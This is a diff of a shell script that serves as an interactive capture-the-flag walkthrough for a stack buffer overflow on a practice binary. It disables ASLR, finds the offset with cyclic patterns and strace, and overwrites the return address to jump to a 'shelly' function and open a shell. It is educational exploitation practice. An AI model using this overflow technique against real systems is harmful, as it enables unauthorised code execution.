@@ -1,46 +1,118 @@
 #!/bin/sh
 
-## turn off aslr (requires password)
+BLUE="\033[1;34m"
+NEUT="\033[0m"
+
+printf "$BLUE
+Turn off aslr (requires password)
+$NEUT 
+../../aslr.sh off"
+read
 ../../aslr.sh off
 
-## first test blind for overflow
-## I use the pwntools built in cyclic tool which generates de Bruijn sequences of x bytes
-## you can just as easily use python3 -c 'print("A"*100)' | ./vuln for additional control
-cyclic 100 | ./vuln    # none
-cyclic 150 | ./vuln    # segmentation fault
-cyclic 120 | ./vuln    # none
-cyclic 121 | ./vuln    # bus error (??)
-cyclic 122 | ./vuln    # segmentation fault
+printf "$BLUE
+This file will walk you through my thought process solving this level
+You should quit and try it by yourself if you haven't already
+(Enter to continue)"
+read
 
-## now try with strace to check the return address 
-cyclic 122 | strace ./vuln  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7ffff7006166} ---"
-cyclic 123 | strace ./vuln  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7fff00616166} ---"
-cyclic 124 | strace ./vuln  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f0062616166} ---"
-cyclic 125 | strace ./vuln  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x6762616166} ---"
-cyclic 126 | strace ./vuln  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x616762616166} ---"
-cyclic 127 | strace ./vuln  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SI_KERNEL, si_addr=NULL} ---"
+printf "$BLUE
+I first test blind for overflow
+I use the pwntools built in cyclic tool which generates de Bruijn sequences of x bytes
+You can just as easily use python3 -c 'print("A"*100)' | ./vuln for additional control
+Lets see if we can find the size of the buffer
+$NEUT
+cyclic 100 | ./vuln" 
+read
+cyclic 100 | ./vuln     # none
 
-## 127 seems to overide the return address completely
-## I know I want to jump to a function called shelly
-## try find the function address with objdump
-objdump -d vuln | grep shelly  # "0000000000401166 <shelly>:"
+printf "
+cyclic 150 | ./vuln"
+read
+cyclic 150 | ./vuln     # segmentation fault
 
-## lets try overwrite the return with this address (won't work with python3)
-python2 -c 'print("A"*120 + "\x40\x11\x66\x00\x00\x00\x00\x00")' | ./vuln  # segmentation fault
-python2 -c 'print("A"*121 + "\x40\x11\x66\x00\x00\x00\x00\x00")' | ./vuln  # segmentation fault
+printf "$BLUE
+I get a segmentation fault
+$NEUT
+cyclic 120 | ./vuln"
+read
+cyclic 120 | ./vuln     # none
 
-## we can use a radare profile fill to set stdin and debug
-python2 -c 'print("A"*120 + "\x40\x11\x66\x00\x00\x00\x00\x00")' > pattern
-echo "#\!/bin/rarun2
-stdin=./pattern" > profile.rr2
-# r2 -r profile.rr2 -d vuln 
+printf "
+cyclic 121 | ./vuln"
+read
+cyclic 121 | ./vuln     # bus error (??)
 
-## I find out \x66 and \x44 are back to front and try again
-python2 -c 'print("A"*120 + "\x66\x11\x40\x00\x00\x00\x00\x00")' | ./vuln          # nothing 
-(python2 -c 'print("A"*120 + "\x66\x11\x40\x00\x00\x00\x00\x00")'; cat) | ./vuln   # this is a hack to keep stdin open, stalls
-# ls  
-# vuln pattern  profile.rr2  sol
+printf "
+cyclic 122 | ./vuln"
+read
+cyclic 122 | ./vuln     # segmentation fault
 
-## solved!
+printf "$BLUE
+Seems like the buffer is around 120 bytes
+Now try with strace to check the return address (si_addr)
+(2>&1 just redirects stderr to stdout so we can grep it)
+$NEUT
+cyclic 122 | strace ./vuln 2>&1 | grep SIGSEGV" 
+read
+cyclic 122 | strace ./vuln 2>&1 | grep SIGSEGV  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7ffff7006166} ---"
+
+printf "
+cyclic 123 | strace ./vuln 2>&1 | grep SIGSEGV"
+read
+cyclic 123 | strace ./vuln 2>&1 | grep SIGSEGV  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7fff00616166} ---"
+
+printf "
+cyclic 124 | strace ./vuln 2>&1 | grep SIGSEGV"
+read
+cyclic 124 | strace ./vuln 2>&1 | grep SIGSEGV
+
+printf "
+cyclic 125 | strace ./vuln 2>&1 | grep SIGSEGV"
+read
+cyclic 125 | strace ./vuln 2>&1 | grep SIGSEGV  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x6762616166} ---"
+
+printf "
+cyclic 126 | strace ./vuln 2>&1 | grep SIGSEGV"
+read
+cyclic 127 | strace ./vuln 2>&1 | grep SIGSEGV  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SI_KERNEL, si_addr=NULL} ---"
+
+printf "$BLUE
+127 seems to overide the return address completely
+I know I want to jump to a function called shelly
+Try find the function address with objdump
+$NEUT
+objdump -d vuln | grep shelly"
+read
+objdump -d vuln | grep shelly  # "0000000000401166 <shelly>:
+
+## hack to get your addressing
+ADDRESS=`objdump -d vuln | grep shelly | cut -d " " -f1`
+ADRBYTES=`python3 -c "
+from pwn import p64
+print(p64(0x$ADDRESS))
+"`
+
+printf "$BLUE
+lets try overwrite the return with this address (won't work with python3)
+$NEUT
+python2 -c 'print(b'A'*121 + $ADRBYTES)' | ./vuln\""
+read
+python2 -c "print(b'A'*121 + $ADRBYTES)" | ./vuln  # segmentation fault
+
+printf "
+python2 -c 'print('A'*120 + $ADRBYTES)' | ./vuln"
+read
+python2 -c "print(b'A'*120 + $ADRBYTES)" | ./vuln
+
+printf "$BLUE
+Looks like we hit the shelly function!
+The next command will use cat to hold open stdin
+This should open a shell, completing the challenge
+$NEUT
+(python2 -c \"print(b'A'*120 + $ADRBYTES)\"; cat) | ./vuln"
+read
+(python2 -c "print(b'A'*120 + $ADRBYTES)"; cat) | ./vuln
+
 
 
